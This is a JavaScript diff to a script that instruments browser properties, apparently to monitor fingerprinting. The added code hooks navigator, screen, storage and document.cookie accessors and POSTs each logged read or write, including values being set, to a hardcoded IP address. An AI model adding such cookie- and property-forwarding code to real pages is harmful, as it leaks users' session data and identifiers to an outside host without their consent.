@@ -1,41 +1,36 @@
 var monitorD = {
     'window' : {
         'navigator' : {
-            'appCodeName' : { '' : true },
-            'appName' : { '' : true },
-            'appVersion' : { '' : true },
-            'cookieEnabled' : { '' : true },
-            'geolocation' : { '' : true },
-            'language' : { '' : true },
-            'languages' : { '' : true },
-            'onLine' : { '' : true },
-            'oscpu' : { '' : true },
-            'platform' : { '' : true },
-            'product' : { '' : true },
-            'productSub' : { '' : true },
-            'userAgent' : { '' : true },
-            'vendorSub' : { '' : true },
-            'vendor' : { '' : true },
-            'plugins' : { '' : true }
+            'appCodeName' : true,
+            'appName' : true,
+            'appVersion' : true,
+            'cookieEnabled' : true,
+            'geolocation' : true,
+            'language' : true,
+            'languages' : true,
+            'onLine' : true,
+            'oscpu' : true,
+            'platform' : true,
+            'product' : true,
+            'productSub' : true,
+            'userAgent' : true,
+            'vendorSub' : true,
+            'vendor' : true,
+            'plugins' : true
         },
         'document' : {
-            'hasStorageAccess' : { '' : true },
-            'requestStorageAccess' : { '' : true }
-        },
-        'WebGL2RenderingContext' : {
-        },
-        'WebGLRenderingContext' : {
+            'hasStorageAccess' : true,
+            'requestStorageAccess' : true,
+            'cookie' : true
         },
         'screen' : {
+            'pixelDepth' : true,
+            'colorDepth' : true,
+            'height' : true,
+            'width' : true
         },
-        'name' : {
-        },
-        'localStorage' : {
-        },
-        'sessionStorage' : {
-        },
-        'HTMLCanvansElement' : {
-        }
+        'localStorage' : true,
+        'sessionStorage' : true
     }
 };
 
@@ -48,6 +43,14 @@ Object.getPropertyDescriptor = function (subject, name) {
     }
     return pd;
 };
+
+function send_log(log_str) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", 'http://1.255.54.63:10921/server', true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send(log_str)
+}
+
 
 function instrumentProperty(object, objectName,  propertyName) {
     var propDesc = Object.getPropertyDescriptor(object, propertyName);
@@ -81,7 +84,7 @@ function instrumentProperty(object, objectName,  propertyName) {
                 return;
             }
 
-            console.log(objectName + '.' + propertyName + origProperty +
+            send_log(objectName + '.' + propertyName + origProperty +
                     "get");
                 return origProperty;
             }
@@ -106,7 +109,7 @@ function instrumentProperty(object, objectName,  propertyName) {
             }
 
             // log set
-            console.log(objectName + '.' + propertyName + value +
+            send_log(objectName + '.' + propertyName + value +
                 "set");
             // return new value
             return returnValue;
@@ -120,3 +123,24 @@ function instrumentProperty(object, objectName,  propertyName) {
         // monitor(object, propertyName);
     }
 }
+
+function instrumentTree(object, base) {
+    for (var key in object)
+    {
+        try
+        {
+            if (object[key] === true)
+            {
+                instrumentProperty(eval(base), base, key);
+            }
+            else if (object[key] instanceof Object) {
+                instrumentTree(object[key], base + "." + key);
+            }
+        }
+        catch (err)
+        {
+        }
+    }
+}
+
+instrumentTree(monitorD['window'], 'window');
